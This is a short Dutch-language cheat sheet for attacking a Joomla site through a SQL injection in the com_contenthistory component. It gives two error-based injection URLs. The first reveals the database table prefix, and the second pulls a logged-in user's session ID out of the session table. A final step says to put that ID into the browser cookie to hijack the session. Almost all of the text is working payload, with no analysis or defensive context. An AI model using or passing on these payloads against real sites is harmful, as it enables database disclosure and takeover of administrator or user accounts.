1) Eerst table prefix achterhalen
    index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=74&type_id=1&list[select]=(SELECT%201%20FROM%20(SELECT%20COUNT(*),CONCAT((SELECT%20(SHOW%20TABLES),%20FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)

SQL error uitlezen

2) Dan aanval uitvoeren (#__session vervangen):

    index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=(SELECT 1 from (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(session_id)) FROM #__session WHERE guest=0 LIMIT 0,1), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

Session ID uitlezen (maar zonder de toegevoegde 1)

3) In Firefox Webdeveloper Tools (oid) cookie waarde aanpassen
